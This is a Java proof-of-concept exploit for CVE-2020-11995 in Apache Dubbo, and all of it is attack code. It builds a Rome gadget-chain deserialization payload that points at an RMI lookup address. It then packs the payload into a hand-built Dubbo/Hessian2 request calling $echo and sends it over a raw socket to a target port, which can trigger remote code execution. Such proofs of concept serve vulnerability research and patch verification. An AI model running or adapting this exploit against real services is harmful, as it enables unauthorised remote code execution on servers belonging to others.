package org.example;

import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

/**
 * @author Whoopsunix
 * <p>
 * CVE-2020-11995
 */
public class CVE_2020_11995 {
    public static void main(String[] args) throws Exception {
        Object o = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/sbm9gt");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        out.writeUTF("2.0.2");
        out.writeUTF("org.example.api.DemoService");
        out.writeUTF("0.0.0");
//        out.writeUTF("$invoke");
//        out.writeUTF("Ljava/util/Map;");
        out.writeUTF("$echo");
        out.writeUTF("Ljava/lang/Object;");
        out.writeObject(o);
        out.writeObject(new HashMap());

        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        Socket socket = new Socket("127.0.0.1", 12345);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }


}
